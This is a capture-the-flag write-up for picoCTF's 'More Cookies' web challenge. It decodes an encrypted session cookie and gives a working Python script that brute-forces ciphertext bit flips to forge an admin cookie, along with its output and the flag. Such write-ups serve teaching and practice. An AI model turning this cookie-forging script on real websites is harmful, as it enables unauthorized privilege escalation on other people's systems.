# More Cookies
Category: Web, 90 points

## Description

> I forgot Cookies can Be modified Client-side, so now I decided to encrypt them! 

## Solution

We visit the attached website and receive the following cookie:

```console
┌──(user@kali)-[/media/sf_CTFs/pico/More_Cookies]
└─$ curl -I http://mercury.picoctf.net:15614/
HTTP/1.1 302 FOUND
Content-Type: text/html; charset=utf-8
Content-Length: 209
Location: http://mercury.picoctf.net:15614/
Set-Cookie: auth_name=NlhkcGZnRzdqRW53OXgwUFFZdGZKSCt3YWtzb0pPUzlxUDY0YzFndmx0UHhiamk3Y3QwaFdvMGJDMzV2MitiU3c3VkdOTjVVWVdpUTMxUlFkUGdjdk9rUFBTbFRJaGtESFZXZkQzcEM4cEdPZXZCZEtDek5EQzdFS2l4KzJWTW4=; Path=/
```

Let's decode it as base64:

```console
┌──(user@kali)-[/media/sf_CTFs/pico/More_Cookies]
└─$ echo NlhkcGZnRzdqRW53OXgwUFFZdGZKSCt3YWtzb0pPUzlxUDY0YzFndmx0UHhiamk3Y3QwaFdvMGJDMzV2MitiU3c3VkdOTjVVWVdpUTMxUlFkUGdjdk9rUFBTbFRJaGtESFZXZkQzcEM4cEdPZXZCZEtDek5EQzdFS2l4KzJWTW4= | base64 -d
6XdpfgG7jEnw9x0PQYtfJH+waksoJOS9qP64c1gvltPxbji7ct0hWo0bC35v2+bSw7VGNN5UYWiQ31RQdPgcvOkPPSlTIhkDHVWfD3pC8pGOevBdKCzNDC7EKix+2VMn
```

It's another base64 encoded string. Let's continue decoding:

```console
┌──(user@kali)-[/media/sf_CTFs/pico/More_Cookies]
└─$ echo 6XdpfgG7jEnw9x0PQYtfJH+waksoJOS9qP64c1gvltPxbji7ct0hWo0bC35v2+bSw7VGNN5UYWiQ31RQdPgcvOkPPSlTIhkDHVWfD3pC8pGOevBdKCzNDC7EKix+2VMn | base64 -d | xxd -g 1
00000000: e9 77 69 7e 01 bb 8c 49 f0 f7 1d 0f 41 8b 5f 24  .wi~...I....A._$
00000010: 7f b0 6a 4b 28 24 e4 bd a8 fe b8 73 58 2f 96 d3  ..jK($.....sX/..
00000020: f1 6e 38 bb 72 dd 21 5a 8d 1b 0b 7e 6f db e6 d2  .n8.r.!Z...~o...
00000030: c3 b5 46 34 de 54 61 68 90 df 54 50 74 f8 1c bc  ..F4.Tah..TPt...
00000040: e9 0f 3d 29 53 22 19 03 1d 55 9f 0f 7a 42 f2 91  ..=)S"...U..zB..
00000050: 8e 7a f0 5d 28 2c cd 0c 2e c4 2a 2c 7e d9 53 27  .z.](,....*,~.S'
```

According the the challenge description, this must be the encrypted cookie. The challenge said that since cookies can be modified on the client side, the mitigation was to encrypt them. However, if the encryption method is [Homomorphic](https://en.wikipedia.org/wiki/Homomorphic_encryption), changes made to the encrypted form will affect the decrypted form. This can be exploited using a [Bit Flipping Attack](https://en.wikipedia.org/wiki/Bit-flipping_attack).

So, we hope that somewhere in the cookie we have something like `admin=0`, and start flipping bits so that the plaintext will be transformed to `admin=1`. 

```python
from pwn import *
import requests
import base64
import re

URL = "http://mercury.picoctf.net:15614/"
COOKIE_NAME = "auth_name"

def main():
    s = requests.Session()
    r = s.get(URL)
    cookie = s.cookies[COOKIE_NAME]
    raw_cookie = bytearray(base64.b64decode(base64.b64decode(cookie)))
    log.info(f"Cookie: {cookie}")

    with log.progress("Flipping bits") as p:
        for byte_index in range(len(raw_cookie)):
            for i in range(8):
                mask = (1 << i)

                p.status(f"Trying to flip index {byte_index}/{len(raw_cookie)} with mask {hex(mask)}")

                # Flip the bit
                raw_cookie[byte_index] ^= mask

                new_cookie = base64.b64encode(base64.b64encode(raw_cookie)).decode("ascii")
                r = requests.get(URL, cookies = {COOKIE_NAME: new_cookie})
                if (m:= re.search(r"picoCTF{[^}]+}", r.text)) is not None:
                    log.success(f"Flipped index {byte_index}/{len(raw_cookie)} with mask {hex(mask)}, Flag: {m.group(0)}")
                    return

                # Flip the bit back
                raw_cookie[byte_index] ^= mask

if __name__ == "__main__":
    main()
```

Output:

```console
┌──(user@kali)-[/media/sf_CTFs/pico/More_Cookies]
└─$ python3 solve.py
[*] Cookie: TU1oWUZvMU9iOXhndGUrc3krbWRuWFVJRERHSE5oekxHcm5FZEhocDM1WEphZHNVaTBhcUpuTG5IbmZQU1VZbWNNWnBmbTlVWlA4ZE9neEJ3dmlFR002M0dmRzNpNy9JYkUyQVVvdFl2SHhJYlUyNzlqdkRIdUJIWk9IeVVIbHk=
[+] Flipping bits: Done
[+] Flipped index 9/96 with mask 0x1, Flag: picoCTF{cO0ki3s_yum_a9a19fa6}
```